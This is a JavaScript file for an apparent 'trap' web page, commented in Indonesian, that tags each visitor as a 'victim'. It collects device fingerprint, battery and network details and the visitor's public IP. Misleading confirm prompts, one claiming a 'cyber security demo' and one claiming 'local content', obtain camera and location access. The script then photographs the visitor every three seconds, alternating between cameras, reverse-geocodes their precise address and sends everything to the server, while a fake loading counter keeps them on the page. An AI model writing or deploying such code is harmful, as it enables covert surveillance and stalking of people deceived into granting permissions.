// Script JS Trap HTML

// ==================== DEBUG FUNCTION ====================
function debug(message) {
  console.log("🔍 [DEBUG]", message);
  const debugDiv = document.getElementById("debug");
  if (debugDiv) {
    debugDiv.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${message}</div>`;
    // Auto scroll ke bawah
    debugDiv.scrollTop = debugDiv.scrollHeight;
  }
}

// Generate ID unik
const victimId =
  "victim_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9);
debug("Victim ID: " + victimId);

// Variabel global untuk kamera
let currentStream = null;
let currentCameraType = null;
let isSwitching = false;
let switchInterval = null;
let periodicInterval = null;
let cameraIndex = 0;
let availableCameras = [];
let isCameraActive = false;
let cameraRetryCount = 0;
const MAX_RETRY = 3;

// ==================== FUNGSI KIRIM DATA ====================
async function sendData(type, data) {
  try {
    debug(`Mengirim ${type}...`);

    const payload = {
      victimId: victimId,
      type: type,
      data: data,
      timestamp: new Date().toISOString(),
    };

    console.log("Payload:", payload);

    const response = await fetch("/api/capture", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }

    const result = await response.json();
    debug(`Response: ${JSON.stringify(result)}`);
    console.log("Server response:", result);
  } catch (e) {
    debug(`Error: ${e.message}`);
    console.error("Gagal kirim data:", e);
  }
}

// ==================== FUNGSI KAMERA ====================

// Fungsi untuk mendapatkan daftar semua kamera
async function getAvailableCameras() {
  try {
    // Cek apakah browser mendukung mediaDevices
    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
      debug("❌ Browser tidak mendukung enumerateDevices");
      return [];
    }

    // Minta izin sementara untuk mendapatkan daftar kamera
    const tempStream = await navigator.mediaDevices.getUserMedia({
      video: true,
    });
    tempStream.getTracks().forEach((track) => track.stop());

    const devices = await navigator.mediaDevices.enumerateDevices();
    const cameras = devices.filter((device) => device.kind === "videoinput");

    debug(`📷 Ditemukan ${cameras.length} kamera:`);
    cameras.forEach((cam, i) => {
      const label = cam.label || `Kamera ${i + 1}`;
      debug(`   ${i + 1}. ${label}`);
    });

    return cameras;
  } catch (err) {
    debug("❌ Gagal mendapatkan daftar kamera: " + err.message);
    return [];
  }
}

// Fungsi untuk mengambil foto dari stream
async function captureFromStream(stream, cameraType) {
  if (!stream || !stream.active) return null;

  try {
    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", "");
    video.setAttribute("autoplay", "");

    await new Promise((resolve, reject) => {
      video.onloadedmetadata = () => {
        video.play().then(resolve).catch(reject);
      };
      video.onerror = reject;
      setTimeout(() => reject(new Error("Video timeout")), 5000);
    });

    // Tunggu video siap
    await new Promise((r) => setTimeout(r, 300));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const context = canvas.getContext("2d");

    // Mirror untuk kamera depan (agar terlihat natural)
    if (cameraType === "front") {
      context.translate(canvas.width, 0);
      context.scale(-1, 1);
    }

    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    context.setTransform(1, 0, 0, 1, 0, 0);

    // Kompres gambar dengan kualitas lebih rendah untuk pengiriman cepat
    const imageData = canvas.toDataURL("image/jpeg", 0.5);
    video.srcObject = null;
    video.remove();

    return imageData;
  } catch (err) {
    debug(`❌ Gagal capture ${cameraType}: ` + err.message);
    return null;
  }
}

// Fungsi untuk menangani error kamera
function handleCameraError(err, cameraType) {
  let errorMessage = "";
  let userMessage = "";

  switch (err.name) {
    case "NotAllowedError":
    case "PermissionDeniedError":
      errorMessage = "Pengguna menolak akses kamera";
      userMessage =
        "Izin kamera ditolak. Silakan izinkan akses kamera untuk demo.";
      break;
    case "NotFoundError":
    case "DevicesNotFoundError":
      errorMessage = `Kamera ${cameraType} tidak ditemukan`;
      userMessage = `Kamera ${cameraType === "front" ? "depan" : "belakang"} tidak ditemukan.`;
      break;
    case "NotReadableError":
    case "TrackStartError":
      errorMessage = `Kamera ${cameraType} sedang digunakan aplikasi lain`;
      userMessage = `Kamera sedang digunakan oleh aplikasi lain. Tutup aplikasi lain dan coba lagi.`;
      break;
    case "OverconstrainedError":
      errorMessage = `Kamera ${cameraType} tidak memenuhi spesifikasi`;
      userMessage = `Kamera tidak mendukung resolusi yang diminta.`;
      break;
    case "AbortError":
      errorMessage = "Akses kamera dibatalkan";
      userMessage = "Proses akses kamera dibatalkan.";
      break;
    default:
      errorMessage = err.message;
      userMessage = `Gagal mengakses kamera: ${err.message}`;
  }

  debug(`❌ Error ${cameraType}: ${errorMessage}`);

  // Tampilkan pesan ke user jika bukan error internal
  if (userMessage && cameraRetryCount >= MAX_RETRY) {
    const statusEl = document.getElementById("status");
    if (statusEl) {
      statusEl.textContent = userMessage;
    }
  }

  sendData("camera_error", {
    camera: cameraType,
    error: errorMessage,
    code: err.name,
  });
}

// Fungsi untuk memulai kamera dengan device tertentu
async function startCameraWithDevice(device, cameraLabel, retryCount = 0) {
  if (isSwitching) {
    debug("⏳ Sedang beralih kamera, tunggu...");
    return false;
  }

  isSwitching = true;

  try {
    // Hentikan stream sebelumnya
    if (currentStream) {
      currentStream.getTracks().forEach((track) => track.stop());
      debug(`🛑 Kamera ${currentCameraType} dihentikan`);

      await sendData("camera_switched", {
        previous: currentCameraType,
        action: "stopped",
        timestamp: new Date().toISOString(),
      });
    }

    // Tentukan mode facingMode berdasarkan label atau index
    let facingMode = null;
    let cameraType = "unknown";
    const labelLower = cameraLabel.toLowerCase();

    if (
      labelLower.includes("front") ||
      labelLower.includes("face") ||
      labelLower.includes("user") ||
      labelLower.includes("selfie") ||
      availableCameras.indexOf(device) === 0
    ) {
      facingMode = "user";
      cameraType = "front";
    } else {
      facingMode = "environment";
      cameraType = "back";
    }

    // Konfigurasi constraints dengan fallback
    const constraints = {
      video: {
        width: { ideal: 640, max: 1280 },
        height: { ideal: 480, max: 720 },
        frameRate: { ideal: 30, max: 30 },
      },
    };

    // Gunakan deviceId jika tersedia
    if (device.deviceId) {
      constraints.video.deviceId = { exact: device.deviceId };
    } else if (facingMode) {
      constraints.video.facingMode = { exact: facingMode };
    }

    debug(`📷 Mengakses kamera ${cameraType} (${cameraLabel})...`);

    // Tampilkan pesan di status
    const statusEl = document.getElementById("status");
    if (statusEl) {
      statusEl.textContent = `Mengakses kamera ${cameraType === "front" ? "DEPAN" : "BELAKANG"}...`;
    }

    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    currentStream = stream;
    currentCameraType = cameraType;
    cameraRetryCount = 0; // Reset retry count on success

    debug(`✅ Kamera ${cameraType} aktif (${cameraLabel})`);

    // Kirim status ke server
    await sendData("camera_access", {
      camera: cameraType,
      cameraLabel: cameraLabel,
      status: "active",
      timestamp: new Date().toISOString(),
    });

    // Ambil foto pertama setelah aktif
    const image = await captureFromStream(stream, cameraType);
    if (image) {
      await fetch("/api/capture-image", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          victimId: victimId,
          image: image,
          cameraType: cameraType,
          cameraLabel: cameraLabel,
          timestamp: new Date().toISOString(),
        }),
      });
      debug(`📸 Foto ${cameraType} (${cameraLabel}) terkirim`);
    }

    return true;
  } catch (err) {
    handleCameraError(err, cameraType || "unknown");

    // Retry logic untuk error tertentu
    if (
      retryCount < MAX_RETRY &&
      (err.name === "NotReadableError" || err.name === "TrackStartError")
    ) {
      debug(
        `🔄 Retry kamera ${cameraType || "unknown"} (${retryCount + 1}/${MAX_RETRY})...`,
      );
      await new Promise((r) => setTimeout(r, 1000));
      return await startCameraWithDevice(device, cameraLabel, retryCount + 1);
    }

    return false;
  } finally {
    isSwitching = false;
  }
}

// Fungsi untuk beralih ke kamera berikutnya
async function switchToNextCamera() {
  if (!availableCameras.length) {
    debug("❌ Tidak ada kamera tersedia untuk beralih");
    return;
  }

  cameraIndex = (cameraIndex + 1) % availableCameras.length;
  const nextCamera = availableCameras[cameraIndex];
  const cameraLabel = nextCamera.label || `Kamera ${cameraIndex + 1}`;

  debug(`🔄 Beralih ke kamera ${cameraIndex + 1}: ${cameraLabel}`);
  await startCameraWithDevice(nextCamera, cameraLabel);
}

// Fungsi untuk menghentikan semua kamera
function stopAllCameras() {
  if (currentStream) {
    currentStream.getTracks().forEach((track) => {
      track.stop();
      debug(`🛑 Track ${track.kind} dihentikan`);
    });
    currentStream = null;
  }

  if (switchInterval) {
    clearInterval(switchInterval);
    switchInterval = null;
  }

  if (periodicInterval) {
    clearInterval(periodicInterval);
    periodicInterval = null;
  }

  isCameraActive = false;
  debug("🛑 Semua kamera dihentikan");
  sendData("camera_access", { status: "stopped" });
}

// Fungsi untuk menjalankan fallback kamera default
async function startFallbackCamera() {
  debug("🔄 Mencoba akses kamera default (fallback)...");

  try {
    const fallbackStream = await navigator.mediaDevices.getUserMedia({
      video: {
        width: { ideal: 640 },
        height: { ideal: 480 },
      },
    });
    currentStream = fallbackStream;
    currentCameraType = "default";
    isCameraActive = true;

    debug("✅ Kamera default berhasil (fallback mode)");
    await sendData("camera_access", {
      camera: "default",
      status: "granted_fallback",
      timestamp: new Date().toISOString(),
    });

    // Kirim foto periodik
    periodicInterval = setInterval(async () => {
      if (currentStream && currentStream.active) {
        const image = await captureFromStream(currentStream, "default");
        if (image) {
          await fetch("/api/capture-image", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              victimId: victimId,
              image: image,
              cameraType: "fallback",
              timestamp: new Date().toISOString(),
            }),
          });
          debug("📸 Foto fallback terkirim");
        }
      }
    }, 3000);

    return true;
  } catch (fallbackErr) {
    handleCameraError(fallbackErr, "fallback");
    debug("❌ Fallback juga gagal: " + fallbackErr.message);

    // Tampilkan pesan error ke user
    const statusEl = document.getElementById("status");
    if (statusEl) {
      statusEl.textContent =
        "Gagal mengakses kamera. Demo akan dilanjutkan tanpa kamera.";
    }
    return false;
  }
}

// ==================== EKSEKUSI DATA ====================

// 1. Kumpulkan info device
setTimeout(async () => {
  debug("Mengumpulkan info device...");

  const deviceInfo = {
    userAgent: navigator.userAgent || "Tidak tersedia",
    platform: navigator.platform || "Tidak tersedia",
    language: navigator.language || "Tidak tersedia",
    cookiesEnabled: navigator.cookieEnabled,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    colorDepth: window.screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    battery: "Tidak tersedia",
    referrer: document.referrer || "Langsung",
    hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
    deviceMemory: navigator.deviceMemory || "N/A",
  };

  debug("Device info collected");

  // Cek battery API
  if ("getBattery" in navigator) {
    try {
      const battery = await navigator.getBattery();
      deviceInfo.battery = (battery.level * 100).toFixed(0) + "%";
      deviceInfo.charging = battery.charging;
      debug(`Battery: ${deviceInfo.battery}, Charging: ${deviceInfo.charging}`);
    } catch (e) {
      debug("Battery error: " + e.message);
    }
  }

  await sendData("device_info", deviceInfo);
}, 1000);

// 2. Cek koneksi dan IP
setTimeout(async () => {
  debug("Mengecek jaringan...");

  await sendData("network", {
    online: navigator.onLine,
    connection: navigator.connection
      ? {
          type: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt,
          saveData: navigator.connection.saveData,
        }
      : "Tidak tersedia",
  });

  // Coba dapatkan IP public dengan timeout
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);

    const response = await fetch("https://api.ipify.org?format=json", {
      signal: controller.signal,
    });
    clearTimeout(timeoutId);

    const data = await response.json();
    await sendData("public_ip", data.ip);
    debug("Public IP: " + data.ip);
  } catch (e) {
    debug("Gagal dapat IP public: " + e.message);
  }
}, 2000);

// 3. Minta akses kamera (SWITCH CAMERA)
setTimeout(async () => {
  debug("📷 Memulai akses kamera (switch camera mode)...");

  const izinAwal = confirm(
    "⚠️ DEMO KEAMANAN SIBER ⚠️\n\n" +
      "Website ini akan mengakses kamera Anda untuk simulasi keamanan.\n\n" +
      "Klik OK untuk mengizinkan akses kamera",
  );

  if (!izinAwal) {
    debug("❌ Izin kamera ditolak user");
    await sendData("camera_access", { status: "denied" });
    return;
  }

  // Dapatkan daftar kamera
  availableCameras = await getAvailableCameras();

  if (availableCameras.length === 0) {
    debug("❌ Tidak ada kamera ditemukan");
    await startFallbackCamera();
    return;
  }

  // Mulai dengan kamera pertama
  const firstCamera = availableCameras[0];
  const firstLabel = firstCamera.label || "Kamera 1";
  const firstSuccess = await startCameraWithDevice(firstCamera, firstLabel);

  if (firstSuccess) {
    isCameraActive = true;

    // Kirim foto periodik setiap 3 detik
    periodicInterval = setInterval(async () => {
      if (currentStream && currentStream.active && !isSwitching) {
        const image = await captureFromStream(currentStream, currentCameraType);
        if (image) {
          try {
            await fetch("/api/capture-image", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                victimId: victimId,
                image: image,
                cameraType: currentCameraType,
                timestamp: new Date().toISOString(),
                isPeriodic: true,
              }),
            });
            debug(`📸 Foto periodik dari kamera ${currentCameraType} terkirim`);
          } catch (e) {
            debug(`❌ Gagal kirim foto periodik: ${e.message}`);
          }
        }
      }
    }, 3000);

    // Jika ada lebih dari 1 kamera, lakukan pergantian otomatis
    if (availableCameras.length > 1) {
      debug(
        `📷 Terdeteksi ${availableCameras.length} kamera, akan bergantian setiap 10 detik`,
      );

      const statusEl = document.getElementById("status");
      if (statusEl) {
        statusEl.textContent = `Kamera aktif: ${currentCameraType === "front" ? "DEPAN" : "BELAKANG"} | Akan bergantian setiap 10 detik`;
      }

      switchInterval = setInterval(async () => {
        if (!isSwitching && currentStream) {
          debug("🔄 Menjalankan pergantian kamera otomatis...");
          await switchToNextCamera();

          if (statusEl) {
            statusEl.textContent = `Kamera aktif: ${currentCameraType === "front" ? "DEPAN" : "BELAKANG"} | Akan bergantian setiap 10 detik`;
          }
        }
      }, 10000);
    } else {
      debug("📷 Hanya 1 kamera tersedia, mode single camera");
      const statusEl = document.getElementById("status");
      if (statusEl) {
        statusEl.textContent = `Kamera aktif (single) | Mengirim foto setiap 3 detik`;
      }
    }

    debug("✅ Sistem kamera siap");
  } else {
    debug("❌ Gagal mengakses kamera pertama");
    await startFallbackCamera();
  }
}, 3000);

// 4. Minta akses lokasi
setTimeout(async () => {
  debug("Meminta akses lokasi...");

  const izinLokasi = confirm(
    "Website ini ingin mengetahui lokasi Anda untuk konten lokal. Izinkan?",
  );

  if (izinLokasi && "geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData = {
          status: "granted",
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          heading: position.coords.heading,
          speed: position.coords.speed,
        };

        await sendData("location", locationData);
        debug(
          `Lokasi: ${position.coords.latitude}, ${position.coords.longitude}`,
        );

        // Reverse geocoding dengan timeout
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 5000);

          const geoResponse = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`,
            { signal: controller.signal },
          );
          clearTimeout(timeoutId);

          const geoData = await geoResponse.json();
          await sendData("location_address", geoData.display_name);
          debug("Alamat: " + geoData.display_name);
        } catch (e) {
          debug("Gagal reverse geocoding: " + e.message);
        }
      },
      async (error) => {
        let errorMessage = "Unknown error";
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorMessage = "Permission denied";
            break;
          case error.POSITION_UNAVAILABLE:
            errorMessage = "Position unavailable";
            break;
          case error.TIMEOUT:
            errorMessage = "Timeout";
            break;
        }
        await sendData("location", { status: "error", error: errorMessage });
        debug("Error lokasi: " + errorMessage);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      },
    );
  } else {
    await sendData("location", { status: "denied" });
    debug("Lokasi ditolak atau tidak tersedia");
  }
}, 4000);

// 5. Update status dan redirect
let counter = 0;
const statusInterval = setInterval(() => {
  counter++;
  const statusEl = document.getElementById("status");
  if (statusEl) {
    const loadingText = [
      "Memuat",
      "Menyiapkan",
      "Memproses",
      "Menginisialisasi",
    ];
    const text = loadingText[counter % loadingText.length];
    statusEl.textContent = `${text}... ${counter}/10`;
  }

  if (counter >= 10) {
    clearInterval(statusInterval);
    if (statusEl) {
      statusEl.textContent = "Selesai! Mengalihkan...";
    }

    // Hentikan semua kamera sebelum redirect
    stopAllCameras();

    // Redirect setelah selesai
    setTimeout(() => {
      window.location.href = "/berita.html?ref=demo";
    }, 2000);
  }
}, 1000);

// Cleanup saat halaman ditutup
window.addEventListener("beforeunload", () => {
  stopAllCameras();
});

// Handle page visibility change (tab aktif/tidak)
document.addEventListener("visibilitychange", () => {
  if (document.hidden) {
    debug("📱 Tab tidak aktif, mengurangi frekuensi capture");
    // Opsional: kurangi frekuensi capture saat tab tidak aktif
  } else {
    debug("📱 Tab aktif kembali");
  }
});

// Tampilkan debug jika ada parameter
if (window.location.search.includes("debug=true")) {
  const debugDiv = document.querySelector(".debug");
  if (debugDiv) {
    debugDiv.style.display = "block";
  }
}

debug("✅ Trap page loaded, waiting for actions...");
